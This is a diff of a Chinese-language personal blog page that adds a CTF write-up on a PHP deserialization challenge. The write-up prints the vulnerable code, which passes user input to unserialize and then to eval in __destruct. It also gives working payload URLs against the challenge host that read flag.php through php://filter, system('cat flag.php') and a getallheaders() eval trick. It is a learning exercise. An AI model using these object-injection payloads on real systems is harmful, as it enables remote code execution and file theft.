@@ -229,6 +229,203 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/The_Fifth_Day_for_Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/31/The_Fifth_Day_for_Web/" itemprop="url">The Fifth Day for Web</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-31T15:42:00+08:00">
+                2019-07-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="The-Fifth-Day-for-Web"><a href="#The-Fifth-Day-for-Web" class="headerlink" title="The Fifth Day for Web"></a>The Fifth Day for Web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>别问第四天去哪了，昨晚想做题的时候，buuoj.cn好像被d了，啊凑~。（今天的buuoj也仍然崩着23333，所以今天去做了西电招新赛的题）</p>
+<h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><p>代码审计题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//flag在flag.php里 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $cmd=<span class="string">'index.php'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/\w+\((?R)?\)/'</span>, <span class="keyword">$this</span>-&gt;cmd))&#123; </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a="'</span>.<span class="keyword">$this</span>-&gt;cmd.<span class="string">'";'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'fl'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'ag'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>(@highlight_file(<span class="string">'index.php'</span>,<span class="keyword">true</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (!(preg_match(<span class="string">'/[A-Za-z0-9]+\(/i'</span>, $_GET[<span class="string">'fl'</span>]))) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> unserialize($_GET[<span class="string">'ag'</span>]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>首先，fl 和 ag要赋值</p>
+</li>
+<li><p>然后，fl这个正则是任意字母数字加一个左括号</p>
+</li>
+</ol>
+<p>那么，fl=123(</p>
+<ol start="3">
+<li>然后是ag的值</li>
+</ol>
+<p>这里有个反序列化，在加上flag类有一个魔术方法__destruct()，并且魔术方法中的cmd的值可控，所以构成反序列化漏洞。</p>
+<p>然后ag也有一个正则匹配，/\w+\((?R)?\)/，规则就是字符串加一对括号，比如phpinfo()，(?R)?是递归，即</p>
+<p>phpinfo(phpinfo())，phpinfo(phpinfo(phpinfo()))，这样都可以过正则。</p>
+<p>所以接下来要考虑的就是怎么构造ag来拿到flag</p>
+<p>首先eval函数里是，$a=”???”;</p>
+<p>是一个赋值语句，这显然没办法拿到flag，所以考虑闭合他，构造cmd=a()”;        (这样是为了绕过正则)</p>
+<p>然后再加点，cmd=a()”;phpinfo();//</p>
+<p>序列化得：O:4:”flag”:1:{s:3:”cmd”;s:17:”a()”;phpinfo();//“;}</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557457854.png" alt="1564557457854"></p>
+<p>发现网页崩了，去问了出题人，出题人说我都没走进destructi方法（wtf？）</p>
+<p>后来我发现，把源代码中</p>
+<p>else {<br>        echo unserialize($_GET[‘ag’]);<br>    } </p>
+<p>里面的echo去掉才能反序列化，（这又是为啥）</p>
+<p>然后出题人说，把序列化字符串里的对象数目改成2就可以了，（嗯么？）</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557470651.png" alt="1564557470651"></p>
+<p>果然成功了（所以为啥？）</p>
+<p>那么接下来方法就有很多了，我直接写了一个任意文件包含加php伪协议来读取，</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.105.168.42:8001/?fl=123(&amp;ag=O:4:&quot;flag&quot;:2:&#123;s:3:&quot;cmd&quot;;s:74:&quot;a()&quot;;include&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;//&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后师傅们还有别的方法，直接system</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.105.168.42:8001/?fl=123(&amp;ag=O:4:&quot;flag&quot;:2:&#123;s:3:&quot;cmd&quot;;s:30:&quot;a()&quot;;system(&apos;cat flag.php&apos;);//&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557873866.png" alt="1564557873866"></p>
+<p>但是出题人的预期解是不想让你在$ag这个字符串里的括号里面带参数的，（然而那个正则只匹配一次，a()”;system(cat flag.php)        这前半部分过了，正则就过了）</p>
+<p>所以出题人原意是想让你用getallheaders()这个函数2333</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://39.105.168.42:8001/?fl=123(&amp;ag=O:4:&quot;flag&quot;:2:&#123;s:3:&quot;cmd&quot;;s:33:&quot;$&#123;eval(implode(getallheaders()))&#125;&quot;;&#125;</span><br><span class="line"></span><br><span class="line">$a=$&#123;eval(implode(system(&apos;cat flag.php&apos;);//))&#125;</span><br><span class="line"></span><br><span class="line">再加上</span><br><span class="line"></span><br><span class="line">cmd: system(&apos;cat flag.php&apos;);//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564559984788.png" alt="1564559984788"></p>
+<p>（还可以多此一举的读一读base64后的源码23333， system(‘cat flag.php|base64’);//）</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564560169454.png" alt="1564560169454"></p>
+<p>原理呢，，，（我直接用题目的网站测试了）</p>
+<p>cmd: var_dump(getallheaders());//</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 31 Jul 2019 08:12:03 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 699</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">array(10) &#123;</span><br><span class="line">  [&quot;cmd&quot;]=&gt;</span><br><span class="line">  string(28) &quot;var_dump(getallheaders());//&quot;</span><br><span class="line">  [&quot;Host&quot;]=&gt;</span><br><span class="line">  string(18) &quot;39.105.168.42:8001&quot;</span><br><span class="line">  [&quot;Cache-Control&quot;]=&gt;</span><br><span class="line">  string(9) &quot;max-age=0&quot;</span><br><span class="line">  [&quot;Upgrade-Insecure-Requests&quot;]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [&quot;User-Agent&quot;]=&gt;</span><br><span class="line">  string(115) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;</span><br><span class="line">  [&quot;Accept&quot;]=&gt;</span><br><span class="line">  string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">  [&quot;Accept-Encoding&quot;]=&gt;</span><br><span class="line">  string(13) &quot;gzip, deflate&quot;</span><br><span class="line">  [&quot;Accept-Language&quot;]=&gt;</span><br><span class="line">  string(14) &quot;zh-CN,zh;q=0.9&quot;</span><br><span class="line">  [&quot;Connection&quot;]=&gt;</span><br><span class="line">  string(5) &quot;close&quot;</span><br><span class="line">  [&quot;Content-Length&quot;]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cmd: var_dump(implode(getallheaders()));//</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 31 Jul 2019 08:12:32 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 346</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">string(331) &quot;var_dump(implode(getallheaders()));//39.105.168.42:8001max-age=01Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3gzip, deflatezh-CN,zh;q=0.9close2&quot;</span><br></pre></td></tr></table></figure>
+
+<p>所以要把cmd写到第一行，后面cmd后面要加上//来注释掉后面所有的东西</p>
+<p>相当于eval(“var_dump(implode(getallheaders()))”;)</p>
+<p>然后命令$a=${eval(implode(getallheaders()))}    </p>
+<h4 id><a href="#" class="headerlink" title="${}"></a>${}</h4><p>参考：<a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
+<p>有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a = &apos;hello&apos;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 <em>hello</em> 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $$a = &apos;world&apos;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;$a $&#123;$a&#125;&quot;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>与以下语句输出完全相同的结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;$a $hello&quot;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>它们都会输出：hello world。</p>
+<p>所以${}里面的东西好像会当作PHP代码执行，</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564562302508.png" alt="1564562302508"></p>
+<p>c并没有被赋值，然后${}里的内容确实被执行了。</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564562727517.png" alt="1564562727517"></p>
+<p>但是这么测的时候，$c = eval(system(‘ls’));这条赋值语句，赋值的同时，命令也执行了。</p>
+<p>但是针对这道题，去掉${}就解不出来了，可能是php版本还是什么的原因233333</p>
+<p>（知道${}这玩意的作用就好了，溜了溜了~）</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3900,7 +4097,7 @@
 <p>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，</p>
 <p>漏洞根据不同的代码可以导致各种攻击，如代码注入，SQL注入、目录遍历等等</p>
 <p>序列化的不同结果：1. public 2. private 3. protect</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test());</span><br><span class="line">&gt;</span><br><span class="line">    </span><br><span class="line">&gt;O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">"testtest1"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">8</span>:<span class="string">"*test3"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line">&gt;</span><br><span class="line">    </span><br><span class="line">&gt;O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">"testtest1"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">8</span>:<span class="string">"*test3"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>漏洞本质</p>
 <p>unserialize函数的变量可控</p>
@@ -4403,7 +4600,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
